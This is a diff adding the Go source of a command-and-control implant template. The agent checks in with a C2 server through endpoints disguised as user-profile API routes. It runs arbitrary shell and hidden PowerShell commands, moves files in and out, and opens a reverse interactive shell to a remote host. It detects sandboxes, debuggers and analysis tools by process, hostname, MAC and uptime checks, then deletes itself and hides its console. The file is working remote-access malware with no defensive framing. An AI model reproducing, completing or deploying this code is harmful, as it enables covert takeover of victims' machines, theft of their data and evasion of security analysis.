@@ -1,0 +1,1084 @@
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"math/rand"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+	"time"
+
+	"github.com/fernet/fernet-go"
+)
+
+type Agent struct {
+	C2URL                  string
+	AgentID                string
+	Headers                map[string]string
+	HeartbeatInterval      int
+	Jitter                 float64
+	RegisterURI            string
+	TasksURI               string
+	ResultsURI             string
+	InteractiveURI         string
+	InteractiveStatusURI   string
+	Running                bool
+	InteractiveMode        bool
+	Hostname               string
+	Username               string
+	OSInfo                 string
+	SecretKey              *fernet.Key
+	CurrentInteractiveTask string
+	DisableSandbox         bool
+}
+
+type Task struct {
+	ID      int64  `json:"id"`
+	Command string `json:"command"`
+}
+
+type TaskResult struct {
+	TaskID string `json:"task_id"`
+	Result string `json:"result"`
+}
+
+type ApiResponse struct {
+	Status   string      `json:"status"`
+	Tasks    []Task      `json:"tasks,omitempty"`
+	Interval int         `json:"checkin_interval,omitempty"`
+	Jitter   float64     `json:"jitter,omitempty"`
+	InteractiveMode bool `json:"interactive_mode,omitempty"`
+	Command  string      `json:"command,omitempty"`
+	TaskID   string      `json:"task_id,omitempty"`
+}
+
+func NewAgent(agentID, secretKey, c2URL string, disableSandbox bool) (*Agent, error) {
+	var fernetKey fernet.Key
+
+	if secretKey != "" {
+		key, err := fernet.DecodeKey(secretKey)
+		if err != nil {
+			return nil, fmt.Errorf("failed to decode secret key: %v", err)
+		}
+		fernetKey = *key
+	}
+
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+	if username == "" {
+		username = "unknown"
+	}
+
+	osInfo := runtime.GOOS + " " + runtime.GOARCH
+
+	agent := &Agent{
+		C2URL:               c2URL,
+		AgentID:             agentID,
+		Headers:             map[string]string{"User-Agent": "Go C2 Agent"},
+		HeartbeatInterval:   60,
+		Jitter:              0.2,
+		RegisterURI:         "/api/users/register",
+		TasksURI:            "/api/users/{agent_id}/profile",
+		ResultsURI:          "/api/users/{agent_id}/activity",
+		InteractiveURI:      "/api/users/{agent_id}/settings",
+		InteractiveStatusURI: "/api/users/{agent_id}/status",
+		Hostname:            hostname,
+		Username:            username,
+		OSInfo:              osInfo,
+		SecretKey:           &fernetKey,
+		InteractiveMode:     false,
+		Running:             false,
+		CurrentInteractiveTask: "",
+		DisableSandbox:      disableSandbox,
+	}
+
+	return agent, nil
+}
+
+func (a *Agent) encryptData(data string) (string, error) {
+	if a.SecretKey == nil {
+		return data, nil
+	}
+
+	encrypted, err := fernet.EncryptAndSign([]byte(data), a.SecretKey)
+	if err != nil {
+		return data, err
+	}
+
+	return base64.URLEncoding.EncodeToString(encrypted), nil
+}
+
+func (a *Agent) decryptData(encryptedData string) (string, error) {
+	if a.SecretKey == nil {
+		return encryptedData, nil
+	}
+
+	decoded, err := base64.URLEncoding.DecodeString(encryptedData)
+	if err != nil {
+		return encryptedData, err
+	}
+
+	keys := []*fernet.Key{a.SecretKey}
+	decrypted := fernet.VerifyAndDecrypt(decoded, 0, keys) // 0 TTL means no expiration checking
+
+	if decrypted == nil {
+		return encryptedData, fmt.Errorf("failed to decrypt data")
+	}
+
+	return string(decrypted), nil
+}
+
+func (a *Agent) send(method, uriTemplate string, data interface{}) (*ApiResponse, error) {
+	uri := strings.Replace(uriTemplate, "{agent_id}", a.AgentID, -1)
+	url := a.C2URL + uri
+
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		DisableKeepAlives: false,  // Keep connections alive for efficiency
+		MaxIdleConns: 10,
+		IdleConnTimeout: 90 * time.Second,
+	}
+	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
+
+	var req *http.Request
+	var err error
+
+	if data != nil {
+		jsonData, err := json.Marshal(data)
+		if err != nil {
+			return nil, err
+		}
+		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
+		if err != nil {
+			return nil, err
+		}
+		req.Header.Set("Content-Type", "application/json")
+	} else {
+		req, err = http.NewRequest(method, url, nil)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	for key, value := range a.Headers {
+		req.Header.Set(key, value)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
+	}
+
+
+	var apiResp ApiResponse
+	err = json.Unmarshal(body, &apiResp)
+	if err != nil {
+		return nil, err
+	}
+
+	return &apiResp, nil
+}
+
+func (a *Agent) register() error {
+	if !a.DisableSandbox {
+		if a.checkSandbox() {
+			a.selfDelete()
+			return fmt.Errorf("sandbox detected, agent self-deleting")
+		}
+
+		if a.checkDebuggers() {
+			a.selfDelete()
+			return fmt.Errorf("debugger detected, agent self-deleting")
+		}
+	}
+
+	data := map[string]interface{}{
+		"agent_id":         a.AgentID,
+		"hostname":         a.Hostname,
+		"os_info":          a.OSInfo,
+		"user":             a.Username,
+		"listener_id":      "web_app_default", // This should match the listener name
+		"interactive_capable": true,
+		"secret_key":       a.SecretKey,
+	}
+
+	resp, err := a.send("POST", a.RegisterURI, data)
+	if err != nil {
+		return err
+	}
+
+	if resp.Status == "success" {
+		if resp.Interval != 0 {
+			a.HeartbeatInterval = resp.Interval
+		}
+		if resp.Jitter != 0 {
+			a.Jitter = resp.Jitter
+		}
+		return nil
+	}
+
+	return fmt.Errorf("registration failed: %s", resp.Status)
+}
+
+func (a *Agent) getTasks() ([]Task, error) {
+	resp, err := a.send("GET", a.TasksURI, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.Status == "success" {
+		tasks := resp.Tasks
+		for i := range tasks {
+			if a.SecretKey != nil {
+				decryptedCmd, err := a.decryptData(tasks[i].Command)
+				if err == nil {
+					tasks[i].Command = decryptedCmd
+				}
+			}
+		}
+		return tasks, nil
+	}
+
+	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
+}
+
+func (a *Agent) checkInteractiveStatus() (bool, error) {
+	resp, err := a.send("GET", a.InteractiveStatusURI, nil)
+	if err != nil {
+		return false, err
+	}
+
+	if resp.Status == "success" {
+		return resp.InteractiveMode, nil
+	}
+
+	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
+}
+
+func (a *Agent) getInteractiveCommand() (*Task, error) {
+	resp, err := a.send("GET", a.InteractiveURI, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	if resp.Status == "success" && resp.Command != "" {
+		taskID, err := strconv.ParseInt(resp.TaskID, 10, 64)
+		if err != nil {
+			taskID = 0 // Default to 0 if parsing fails
+		}
+
+		task := &Task{
+			ID:      taskID,
+			Command: resp.Command,
+		}
+
+		if a.SecretKey != nil {
+			decryptedCmd, err := a.decryptData(task.Command)
+			if err == nil {
+				task.Command = decryptedCmd
+			}
+		}
+
+		return task, nil
+	}
+
+	return nil, nil
+}
+
+func (a *Agent) submitInteractiveResult(taskID, result string) error {
+	var encryptedResult string
+	var err error
+	if a.SecretKey != nil {
+		encryptedResult, err = a.encryptData(result)
+		if err != nil {
+			encryptedResult = result
+		}
+	} else {
+		encryptedResult = result
+	}
+
+	data := TaskResult{
+		TaskID: taskID,
+		Result: encryptedResult,
+	}
+
+	_, err = a.send("POST", a.InteractiveURI, data)
+	return err
+}
+
+func (a *Agent) execute(command string) string {
+
+	commandLower := strings.ToLower(strings.TrimSpace(command))
+	isPowerShell := false
+
+	powerShellIndicators := []string{
+		"powershell", "pwsh", "powershell.exe",
+		"$", "get-", "set-", "new-", "remove-", "invoke-",
+		"select-", "where-", "foreach-", "out-", "export-",
+		"import-", "write-", "read-", "clear-", "update-",
+		"|", "get-wmiobject", "get-ciminstance", "start-process",
+		"get-service", "stop-service", "restart-service", "set-service",
+	}
+
+	patternCount := 0
+	for _, pattern := range powerShellIndicators {
+		if strings.Contains(commandLower, pattern) {
+			patternCount++
+		}
+	}
+
+	isPowerShell = patternCount >= 2 ||
+		strings.Contains(commandLower, "get-wmiobject") ||
+		strings.Contains(commandLower, "get-ciminstance") ||
+		strings.Contains(commandLower, "start-process") ||
+		strings.Contains(commandLower, "powershell -")
+
+	if isPowerShell {
+		var cmd *exec.Cmd
+
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", command)
+		} else {
+			cmd = exec.Command("pwsh", "-Command", command)
+		}
+
+		var stdout, stderr bytes.Buffer
+		cmd.Stdout = &stdout
+		cmd.Stderr = &stderr
+
+		err := cmd.Run()
+		if err != nil {
+			return fmt.Sprintf("[ERROR] PowerShell command execution failed: %v", err)
+		}
+
+		output := stdout.String() + stderr.String()
+		if output == "" {
+			return "[PowerShell command executed successfully - no output]"
+		}
+		return output
+	} else {
+		var cmd *exec.Cmd
+
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/C", command)
+		} else {
+			cmd = exec.Command("sh", "-c", command)
+		}
+
+		var stdout, stderr bytes.Buffer
+		cmd.Stdout = &stdout
+		cmd.Stderr = &stderr
+
+		err := cmd.Run()
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
+		}
+
+		output := stdout.String() + stderr.String()
+		if output == "" {
+			return "[Command executed successfully - no output]"
+		}
+		return output
+	}
+}
+
+func (a *Agent) submitTaskResult(taskID, result string) error {
+
+	var encryptedResult string
+	var err error
+	if a.SecretKey != nil {
+		encryptedResult, err = a.encryptData(result)
+		if err != nil {
+			encryptedResult = result
+		} else {
+		}
+	} else {
+		encryptedResult = result
+	}
+
+	data := TaskResult{
+		TaskID: taskID,
+		Result: encryptedResult,
+	}
+
+	_, err = a.send("POST", a.ResultsURI, data)
+	if err != nil {
+	} else {
+	}
+	return err
+}
+
+func (a *Agent) handleModule(encodedScript string) string {
+	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
+	}
+
+	return a.execute(string(decodedScript))
+}
+
+func (a *Agent) handleUpload(command string) string {
+	parts := strings.SplitN(command, " ", 3)
+	if len(parts) != 3 {
+		return "[ERROR] Invalid upload command format."
+	}
+
+	remotePath := parts[1]
+	encodedData := parts[2]
+
+	decodedData, err := base64.StdEncoding.DecodeString(encodedData)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to decode file content: %v", err)
+	}
+
+	err = ioutil.WriteFile(remotePath, decodedData, 0644)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to write file: %v", err)
+	}
+
+	return fmt.Sprintf("[SUCCESS] File uploaded to %s", remotePath)
+}
+
+func (a *Agent) handleDownload(command string) string {
+	parts := strings.SplitN(command, " ", 2)
+	if len(parts) != 2 {
+		return "[ERROR] Invalid download command format."
+	}
+
+	remotePath := parts[1]
+
+	if _, err := os.Stat(remotePath); os.IsNotExist(err) {
+		return fmt.Sprintf("[ERROR] File not found on remote machine: %s", remotePath)
+	}
+
+	fileContent, err := ioutil.ReadFile(remotePath)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to read file: %v", err)
+	}
+
+	encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+	return encodedContent
+}
+
+func (a *Agent) handleTTYShell(command string) string {
+	parts := strings.Split(command, " ")
+	var host string
+	var port string
+
+	if len(parts) >= 3 {
+		host = parts[1]
+		port = parts[2]
+	} else {
+		host = "127.0.0.1"
+		port = "5000"
+	}
+
+	go func() {
+		address := fmt.Sprintf("%s:%s", host, port)
+
+		conn, err := net.Dial("tcp", address)
+		if err != nil {
+			return
+		}
+		defer conn.Close()
+
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")
+		} else {
+			cmd = exec.Command("bash", "-i")
+		}
+
+		stdin, err := cmd.StdinPipe()
+		if err != nil {
+			return
+		}
+		stdout, err := cmd.StdoutPipe()
+		if err != nil {
+			return
+		}
+		stderr, err := cmd.StderrPipe()
+		if err != nil {
+			return
+		}
+
+		if err := cmd.Start(); err != nil {
+			return
+		}
+
+		go func() {
+			_, _ = io.Copy(conn, stdout)
+		}()
+
+		go func() {
+			_, _ = io.Copy(conn, stderr)
+		}()
+
+		go func() {
+			_, _ = io.Copy(stdin, conn)
+		}()
+
+		cmd.Wait()
+	}()
+
+	return fmt.Sprintf("[SUCCESS] TTY shell connection initiated to %s:%s", host, port)
+}
+
+func (a *Agent) handleSleep(command string) string {
+	parts := strings.SplitN(command, " ", 2)
+	if len(parts) != 2 {
+		return "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
+	}
+
+	newSleep, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return "[ERROR] Sleep interval must be a valid integer"
+	}
+
+	if newSleep <= 0 {
+		return "[ERROR] Sleep interval must be a positive integer"
+	}
+
+	a.HeartbeatInterval = newSleep
+	return fmt.Sprintf("[SUCCESS] Sleep interval changed to %d seconds", newSleep)
+}
+
+func (a *Agent) handleBOF(command string) string {
+	parts := strings.SplitN(command, " ", 3) // Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
+	if len(parts) < 2 {
+		return "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
+	}
+
+	encodedBOF := parts[1]
+	bofArgs := ""
+	if len(parts) > 2 {
+		bofArgs = parts[2]
+	}
+
+	bofData, err := base64.StdEncoding.DecodeString(encodedBOF)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
+	}
+
+	_ = bofData // PLACEHOLDER - TO BE IMPLMEENTED FR FR LATER
+	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
+}
+
+func (a *Agent) processCommand(command string) string {
+	if strings.HasPrefix(command, "module ") {
+		encodedScript := command[7:] // Remove "module " prefix
+		return a.handleModule(encodedScript)
+	} else if strings.HasPrefix(command, "upload ") {
+		return a.handleUpload(command)
+	} else if strings.HasPrefix(command, "download ") {
+		return a.handleDownload(command)
+	} else if strings.HasPrefix(command, "tty_shell") {
+		return a.handleTTYShell(command)
+	} else if strings.HasPrefix(command, "sleep ") {
+		return a.handleSleep(command)
+	} else if strings.HasPrefix(command, "bof ") {
+		return a.handleBOF(command)
+	} else if command == "kill" {
+		a.Running = false
+		os.Exit(0)
+		return "[SUCCESS] Agent killed"
+	} else {
+		return a.execute(command)
+	}
+}
+
+func (a *Agent) run() {
+
+	for {
+		err := a.register()
+		if err == nil {
+			break
+		}
+		time.Sleep(30 * time.Second)
+	}
+
+	a.Running = true
+	checkCount := 0
+
+	for a.Running {
+		checkCount++
+
+		if checkCount%3 == 0 {
+			shouldBeInteractive, err := a.checkInteractiveStatus()
+			if err == nil {
+				if shouldBeInteractive && !a.InteractiveMode {
+					a.InteractiveMode = true
+				} else if !shouldBeInteractive && a.InteractiveMode {
+					a.InteractiveMode = false
+				}
+			} else {
+			}
+		}
+
+		if !a.InteractiveMode {
+			tasks, err := a.getTasks()
+			if err != nil {
+				time.Sleep(30 * time.Second)
+				continue
+			}
+
+			for _, task := range tasks {
+				result := a.processCommand(task.Command)
+				err := a.submitTaskResult(strconv.FormatInt(task.ID, 10), result)
+				if err != nil {
+				} else {
+				}
+			}
+		} else {
+			interactiveTask, err := a.getInteractiveCommand()
+			if err != nil {
+			} else if interactiveTask != nil {
+				result := a.processCommand(interactiveTask.Command)
+				err := a.submitInteractiveResult(strconv.FormatInt(interactiveTask.ID, 10), result)
+				if err != nil {
+				} else {
+				}
+			}
+		}
+
+		baseSleep := float64(a.HeartbeatInterval)
+		jitterFactor := (rand.Float64() - 0.5) * 2 * a.Jitter
+		sleepTime := baseSleep * (1 + jitterFactor)
+		if sleepTime < 5 {
+			sleepTime = 5
+		}
+
+		time.Sleep(time.Duration(sleepTime) * time.Second)
+	}
+}
+
+func (a *Agent) stop() {
+	a.Running = false
+}
+
+func (a *Agent) checkSandbox() bool {
+	if a.DisableSandbox {
+		return false
+	}
+
+	cpuCount := runtime.NumCPU()
+	if cpuCount < 2 {
+		return true
+	}
+
+	var totalRAM uint64
+	if runtime.GOOS == "linux" {
+		if data, err := ioutil.ReadFile("/proc/meminfo"); err == nil {
+			lines := strings.Split(string(data), "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "MemTotal:") {
+					parts := strings.Fields(line)
+					if len(parts) >= 2 {
+						if kb, err := strconv.ParseUint(parts[1], 10, 64); err == nil {
+							totalRAM = kb * 1024 // Convert to bytes
+							break
+						}
+					}
+				}
+			}
+		}
+	} else if runtime.GOOS == "windows" {
+		if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
+		   os.Getenv("VBOX_SESSION") != "" ||
+		   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
+		   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
+			return true
+		}
+	}
+
+	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
+		return true
+	}
+
+	hostname, _ := os.Hostname()
+	hostnameLower := strings.ToLower(hostname)
+	sandboxIndicators := []string{
+		"sandbox", "malware", "detected", "test",
+		"cuckoo", "malbox", "innotek",
+		"virtual", "vmware", "vbox", "xen",
+	}
+	for _, indicator := range sandboxIndicators {
+		if strings.Contains(hostnameLower, indicator) {
+			return true
+		}
+	}
+
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+	if username == "" {
+		username = "unknown"
+	}
+	usernameLower := strings.ToLower(username)
+	suspiciousUsers := []string{"sandbox", "malware", "user", "test", "admin"}
+	for _, user := range suspiciousUsers {
+		if usernameLower == user {
+			return true
+		}
+	}
+
+	interfaces, err := net.Interfaces()
+	if err == nil {
+		virtualMacPrefixes := []string{"08:00:27", "00:0c:29", "00:50:56", "00:1c:42", "52:54:00"}
+		for _, iface := range interfaces {
+			mac := iface.HardwareAddr.String()
+			mac = strings.ToLower(mac)
+			for _, prefix := range virtualMacPrefixes {
+				if strings.HasPrefix(mac, prefix) {
+					return true
+				}
+			}
+		}
+	}
+
+	if runtime.GOOS == "linux" {
+		if a.checkProcessesForSandbox() {
+			return true
+		}
+	} else if runtime.GOOS == "windows" {
+		if a.checkWindowsProcessesForSandbox() {
+			return true
+		}
+	}
+
+	currentPath, _ := os.Getwd()
+	currentPath = strings.ToLower(currentPath)
+	suspiciousPaths := []string{
+		"vmware", "virtualbox", "vbox",
+		"sandbox", "cuckoo", "cape", "malware",
+	}
+	for _, path := range suspiciousPaths {
+		if strings.Contains(currentPath, path) {
+			return true
+		}
+	}
+
+	envSandboxIndicators := []string{
+		"SANDBOX", "CUCKOO", "CAPE", "MALWARE",
+		"VIRUSTOTAL", "HYBRID", "ANYRUN",
+	}
+	for _, envVar := range envSandboxIndicators {
+		if os.Getenv(envVar) != "" || os.Getenv(strings.ToLower(envVar)) != "" {
+			return true
+		}
+	}
+
+	if runtime.GOOS == "linux" {
+		if data, err := ioutil.ReadFile("/proc/uptime"); err == nil {
+			parts := strings.Fields(string(data))
+			if len(parts) > 0 {
+				if uptime, err := strconv.ParseFloat(parts[0], 64); err == nil {
+					if uptime < 300 { // Less than 5 minutes
+						return true
+					}
+				}
+			}
+		}
+	}
+
+	suspiciousFiles := []string{
+		"C:\\windows\\temp\\vmware_trace.log",  // VMware
+		"C:\\windows\\temp\\VirtualBox.log",   // VirtualBox
+		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",  // VBox
+		"/tmp/vmware_trace.log",  // VMware on Linux
+		"/tmp/vbox_mouse.log",    // VBox on Linux
+	}
+	for _, file := range suspiciousFiles {
+		if _, err := os.Stat(file); err == nil {
+			return true // File exists
+		}
+	}
+
+	if a.checkNetworkTools() {
+		return true
+	}
+
+	return false
+}
+
+func (a *Agent) checkProcessesForSandbox() bool {
+	cmd := exec.Command("ps", "aux")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	processes := string(output)
+	sandboxProcesses := []string{
+		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
+		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
+		"procexp", "sniff", "netmon", "apimonitor", "regmon",
+		"filemon", "immunity", "windbg", "fiddler",
+	}
+
+	for _, proc := range sandboxProcesses {
+		if strings.Contains(strings.ToLower(processes), proc) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (a *Agent) checkWindowsProcessesForSandbox() bool {
+	cmd := exec.Command("tasklist")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	processes := string(output)
+	sandboxProcesses := []string{
+		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
+		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
+		"procexp", "sniff", "netmon", "apimonitor", "regmon",
+		"filemon", "immunity", "windbg", "fiddler", "apimon",
+		"regmon", "filemon", "sbox", "sandboxie",
+	}
+
+	for _, proc := range sandboxProcesses {
+		if strings.Contains(strings.ToLower(processes), strings.ToLower(proc)) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (a *Agent) checkNetworkTools() bool {
+	if a.DisableSandbox {
+		return false
+	}
+
+	var processes string
+
+	if runtime.GOOS == "linux" {
+		cmd := exec.Command("ps", "aux")
+		output, err := cmd.Output()
+		if err != nil {
+			return false
+		}
+		processes = string(output)
+	} else if runtime.GOOS == "windows" {
+		cmd := exec.Command("tasklist")
+		output, err := cmd.Output()
+		if err != nil {
+			return false
+		}
+		processes = string(output)
+	} else {
+		return false // Not supported on this platform
+	}
+
+	networkTools := []string{
+		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
+		"fiddler", "charles", "netcat", "ncat", "socat", "nmap", "zmap", "masscan",
+		"theharvester", "maltego", "nessus", "openvas", "nessusd", "snort", "suricata",
+		"procmon", "procexp",
+	}
+
+	for _, tool := range networkTools {
+		if strings.Contains(strings.ToLower(processes), tool) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (a *Agent) checkDebuggers() bool {
+	if a.DisableSandbox {
+		return false
+	}
+
+	if runtime.GOOS == "linux" {
+		statusPath := fmt.Sprintf("/proc/%d/status", os.Getpid())
+		if data, err := ioutil.ReadFile(statusPath); err == nil {
+			lines := strings.Split(string(data), "\n")
+			for _, line := range lines {
+				if strings.HasPrefix(line, "TracerPid:") {
+					parts := strings.Fields(line)
+					if len(parts) >= 2 {
+						pid := strings.TrimSpace(parts[1])
+						if pid != "0" {
+							return true // Being traced
+						}
+					}
+				}
+			}
+		}
+	}
+
+	if runtime.GOOS == "linux" {
+		if a.checkProcessesForDebuggers() {
+			return true
+		}
+	} else if runtime.GOOS == "windows" {
+		if a.checkWindowsProcessesForDebuggers() {
+			return true
+		}
+
+		if a.checkWindowsDebugger() {
+			return true
+		}
+	}
+
+	start := time.Now()
+	time.Sleep(10 * time.Millisecond)
+	actualSleep := time.Since(start)
+	expectedSleep := 10 * time.Millisecond
+	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
+		return true
+	}
+
+	return false
+}
+
+func (a *Agent) checkProcessesForDebuggers() bool {
+	cmd := exec.Command("ps", "aux")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	processes := string(output)
+	debuggerProcesses := []string{
+		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
+		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
+	}
+
+	for _, dbg := range debuggerProcesses {
+		if strings.Contains(strings.ToLower(processes), dbg) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (a *Agent) checkWindowsProcessesForDebuggers() bool {
+	cmd := exec.Command("tasklist")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	processes := string(output)
+	debuggerProcesses := []string{
+		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
+		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
+	}
+
+	for _, dbg := range debuggerProcesses {
+		if strings.Contains(strings.ToLower(processes), strings.ToLower(dbg)) {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (a *Agent) checkWindowsDebugger() bool {
+	if runtime.GOOS != "windows" || a.DisableSandbox {
+		return false
+	}
+
+	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
+		"[System.Diagnostics.Debugger]::IsDebuggerPresent()")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+
+	result := strings.TrimSpace(string(output))
+	if strings.Contains(strings.ToLower(result), "true") {
+		return true
+	}
+
+	return false
+}
+
+func (a *Agent) selfDelete() {
+	executable, err := os.Executable()
+	if err != nil {
+		os.Exit(0)
+		return
+	}
+
+	go func() {
+		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits
+
+		if runtime.GOOS == "windows" {
+			batchScript := fmt.Sprintf("@echo off\nping -n 2 127.0.0.1 > nul\ndel \"%s\"\n", executable)
+			batchFile := executable + ".bat"
+
+			if err := ioutil.WriteFile(batchFile, []byte(batchScript), 0644); err != nil {
+				os.Remove(executable)
+				os.Exit(0)
+				return
+			}
+
+			exec.Command("cmd", "/C", "start", "/min", batchFile).Start()
+		} else {
+			os.Remove(executable)
+		}
+
+		os.Exit(0)
+	}()
+}
+
+func hideConsole() {
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "try { Add-Type -Name Win32 -Namespace Console -MemberDefinition '[DllImport(\\\"kernel32.dll\\\")]^ public static extern IntPtr GetConsoleWindow(); [DllImport(\\\"user32.dll\\\")]^ public static extern bool ShowWindow(IntPtr hWnd^, int nCmdShow);'; $consolePtr = [Console.Win32]::GetConsoleWindow(); [Console.Win32]::ShowWindow($consolePtr, 0) } catch { }")
+		_ = cmd.Run() // Run command but ignore errors
+	}
+}
+
+func main() {
+	if runtime.GOOS == "windows" {
+		hideConsole()
+	}
+
+	agentID := "{AGENT_ID}"
+	secretKey := "{SECRET_KEY}"
+	c2URL := "{C2_URL}"
+	disableSandbox := {DISABLE_SANDBOX} // Will be true or false based on generation flag
+
+	agent, err := NewAgent(agentID, secretKey, c2URL, disableSandbox)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	agent.run()
+}
